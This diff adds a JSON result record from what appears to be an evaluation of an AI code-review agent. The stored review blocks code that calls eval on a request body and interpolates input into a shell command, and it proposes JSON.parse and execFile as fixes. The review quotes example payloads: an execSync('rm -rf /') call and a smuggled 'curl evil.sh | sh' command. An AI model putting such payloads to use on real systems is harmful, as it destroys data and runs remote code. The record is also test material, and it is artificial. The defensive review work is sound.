@@ -1,0 +1,66 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "provider_models": [
+    "global.anthropic.claude-opus-4-8"
+  ],
+  "prompt_hash": "a02cc5410b11db1a62c0d90f21c97a686eacb0bb19a0a3793c982827e634dda2",
+  "output": "**BLOCK**\n\n**1. [blocking] Arbitrary code execution via `eval` on request body — CWE-94**\nEvidence: `const payload = eval('(' + req.body + ')');`\n`req.body` is attacker-controlled. Any client can send a payload like `require('child_process').execSync('rm -rf /')` (or `process.exit()`, credential exfiltration, etc.) that `eval` will execute in the server process. This is remote code execution.\nFix: parse structured input instead of evaluating it: `const payload = JSON.parse(req.body);` wrapped in try/catch, with input validation of `payload.target`.\n\n**2. [blocking] OS command injection via unsanitized shell interpolation — CWE-78**\nEvidence: `` exec(`deploy.sh ${payload.target}`); ``\n`payload.target` flows from the untrusted request into a shell string. A value such as `foo; curl evil.sh | sh` or `$(...)`/backticks executes arbitrary shell commands. Even after fixing #1, this is independently exploitable.\nFix: use the argument-array form that avoids a shell: `execFile('deploy.sh', [payload.target])`, and validate `payload.target` against a strict allowlist/regex before use.\n\nNote: both calls also lack any error handling and `exec`/`execFile` are async with no callback, but the two injection vectors above are the blocking concerns.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)(?:^|\\n)\\s*(?:(?:##\\s*)?(?:\\*\\*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)evidence|attack vector"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)fix|replace|execFile|JSON\\.parse"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 2,
+  "output_tokens": 606,
+  "cost_usd": 0.0693735,
+  "duration_ms": 10911
+}
